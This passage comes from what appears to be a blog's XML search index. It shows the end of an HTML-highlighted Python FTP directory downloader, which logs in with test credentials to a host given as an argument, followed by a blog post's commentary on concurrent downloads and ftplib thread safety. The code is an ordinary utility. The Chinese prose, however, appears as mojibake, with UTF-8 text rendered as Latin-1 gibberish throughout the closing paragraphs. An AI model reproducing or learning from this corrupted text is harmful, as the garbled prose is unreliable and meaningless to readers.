class="line">                numFile,</span><br><span class="line">                numDownErr,</span><br><span class="line">                numUnknown</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">return</span> numDir, numFile, numUnknown, numDownErr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="keyword">import</span> traceback</span><br><span class="line">    <span class="keyword">from</span> pprint <span class="keyword">import</span> pprint <span class="keyword">as</span> pr</span><br><span class="line"></span><br><span class="line">    flog = open(<span class="string">'err.log'</span>, <span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(host)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fd = FtpDownloader(</span><br><span class="line">                host=host,</span><br><span class="line">                user=<span class="string">'test'</span>,</span><br><span class="line">                passwd=<span class="string">'test'</span>,</span><br><span class="line">                port=<span class="number">21</span>,</span><br><span class="line">                timeout=<span class="number">10</span></span><br><span class="line">            )</span><br><span class="line">            numDir, numFile, numUnknown, numDownErr = fd.downloadDir(</span><br><span class="line">                rdir=<span class="string">'.'</span>,</span><br><span class="line">                ldir=<span class="string">'download'</span>,</span><br><span class="line">                tree=<span class="literal">None</span>,</span><br><span class="line">                errHandleFunc=<span class="literal">None</span>,</span><br><span class="line">                verbose=<span class="literal">True</span></span><br><span class="line">            )</span><br><span class="line">            flog.write(</span><br><span class="line">                <span class="string">'%s\nok\n'</span></span><br><span class="line">                <span class="string">'%d directories, %d(%d failed) files, %d unknown type\n\n\n'</span> % (</span><br><span class="line">                    host,</span><br><span class="line">                    numDir,</span><br><span class="line">                    numFile,</span><br><span class="line">                    numDownErr,</span><br><span class="line">                    numUnknown</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">            flog.write(</span><br><span class="line">                <span class="string">'%s\nerror\n%s\n\n\n'</span> % (</span><br><span class="line">                    host,</span><br><span class="line">                    traceback.format_exc()</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">    pr(run(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    flog.close()</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ç§»æ­¥è‡³<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2Z0cGRvd24=">github<i class="fa fa-external-link-alt"></i></span>è·å–ä»£ç ï¼Œæ¬¢è¿å®Œå–„ã€‚</p><p>è¿™é‡Œä»…æŠ›ç –å¼•ç‰ï¼Œå®ç°äº†ä¸‹è½½å•ä¸ªFTPçš„æ•´ä¸ªç›®å½•çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œå¯ä»¥åŸºäºè¯¥ä»£ç ç»§ç»­å®ç°å¹¶å‘ä¸‹è½½å¤šä¸ªFTPæœåŠ¡å™¨ä¸Šçš„æŒ‡å®šæ–‡ä»¶å¤¹çš„åŠŸèƒ½ã€‚</p><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™é‡Œé’ˆå¯¹å•ä¸ªFTPæœåŠ¡å™¨ä¸Šçš„å¤šä¸ªæ–‡ä»¶ä¸‹è½½è¿˜æ˜¯ä¸²è¡Œçš„ï¼Œå¦‚æƒ³è¦å®ç°å¹¶å‘ä¸‹è½½å•ä¸ªFTPæœåŠ¡å™¨ä¸Šçš„å¤šä¸ªæ–‡ä»¶ï¼Œåˆ™å¯ä»¥å…ˆé€šè¿‡treeå‡½æ•°å¾—åˆ°FTPæœåŠ¡å™¨çš„ç›®å½•æ ‘ï¼Œç„¶åå†å¹¶å‘ä¸‹è½½ç›¸åº”çš„æ–‡ä»¶ã€‚ä½†å¹¶å‘ä¸‹è½½æ—¶è‹¥å¤šä¸ªä¸‹è½½çº¿ç¨‹å…±ç”¨ä¸€ä¸ªftplib.FTPç±»çš„å®ä¾‹ï¼Œå¹¶è°ƒç”¨è¯¥å®ä¾‹çš„retrbinaryå‡½æ•°è¿›è¡Œä¸‹è½½ï¼Œåˆ™ä¸åŒçº¿ç¨‹ä¹‹é—´å¯èƒ½ä¼šç›¸äº’å½±å“ï¼Œå…·ä½“å¯ä»¥å‚è€ƒftplibçš„æºç ã€‚</p><p>å½“ç„¶ï¼Œè¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥ä¸ºæ¯ä¸ªä¸‹è½½çº¿ç¨‹åˆ›å»ºä¸€ä¸ªç‹¬æœ‰çš„ftplib.FTPç±»çš„å®ä¾‹ï¼Œä½†è¿™æ ·å°±åŠ å¤§äº†FTPæœåŠ¡å™¨å¤„ç†çš„å¹¶å‘è¿æ¥æ•°ï¼Œæœ€å¤§è¿æ¥æ•°åŠä¸‹è½½æ€§èƒ½è¿˜æ˜¯ä¼šå—é™äºFTPæœåŠ¡å™¨ï¼Œå­˜åœ¨ä¸ç¡®å®šæ€§ã€‚</p><p>æˆ‘ä»¬å°†å®ç°çš„ç¨‹åºä¸Fileziliaè¿›è¡Œäº†å¯¹æ¯”æµ‹è¯•ï¼Œå‘ç°å®ƒå¯¹å¤šä¸ªæ–‡ä»¶çš„ä¸‹è½½è¿‡ç¨‹ä¹Ÿæ˜¯ä¸²è¡Œäº†ï¼Œè€Œæœ€ç»ˆä¸‹è½½æ–‡ä»¶çš„æ€»æ•°åŠé€Ÿåº¦äºŒè€…ç›¸è¿‘ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FTP </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
